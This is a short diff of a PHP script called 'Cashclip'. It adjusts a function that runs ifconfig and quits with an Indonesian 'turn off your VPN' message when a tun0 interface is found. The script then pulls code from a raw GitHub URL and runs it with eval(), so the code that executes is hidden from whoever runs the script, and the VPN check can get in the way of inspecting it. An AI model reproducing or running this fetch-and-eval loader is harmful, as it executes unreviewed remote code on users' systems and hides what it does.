@@ -1,16 +1,17 @@
 
 error_reporting(E_ALL);
-function sockk(){
+function sock(){
   $sistemm=shell_exec('2>/dev/null ifconfig');
     
    if(preg_match('/tun0/i',$sistemm)){
-            echo "\033[35mUps Internet Mu Tidak Sehat";
+            echo "\033[1;34mUps Internet Mu Tidak Sehat\n";
             echo "Silakan Matikan Vpn Anda\n";
         exit;
         }
     }
+    sock();
 const script = "Cashclip";
-sockk();
+
 $function = file_get_contents("https://raw.githubusercontent.com/Bagusivo1999/fullscript/refs/heads/main/curlku");
 eval($function);
 
